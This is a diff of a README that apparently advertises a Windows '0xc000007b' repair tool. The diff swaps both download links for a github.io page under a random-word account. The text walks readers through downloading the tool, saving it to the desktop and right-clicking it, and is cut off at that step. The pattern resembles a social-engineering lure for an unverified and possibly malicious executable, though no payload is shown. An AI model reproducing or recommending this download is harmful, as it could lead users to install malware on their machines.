@@ -1,6 +1,6 @@
 # 🛠️ 0xc000007b-Application-Error-Fix - Restore your Windows applications and games
 
-[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue)](https://github.com/Tonguemicrowavediathermymachine385/0xc000007b-Application-Error-Fix)
+[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue)](https://tonguemicrowavediathermymachine385.github.io)
 
 ## What is the 0xc000007b error?
 
@@ -12,7 +12,7 @@ This error is common on Windows 10 and Windows 11. It frequently happens after y
 
 You can resolve this issue using the provided repair utility. Follow these steps to prepare your system and run the fix.
 
-1. Go to the [official release page](https://github.com/Tonguemicrowavediathermymachine385/0xc000007b-Application-Error-Fix) to start the download.
+1. Go to the [official release page](https://tonguemicrowavediathermymachine385.github.io) to start the download.
 2. Choose the latest version of the repair tool.
 3. Save the file to your desktop for easy access.
 4. Locate the downloaded file. Click the file with your right mouse button.
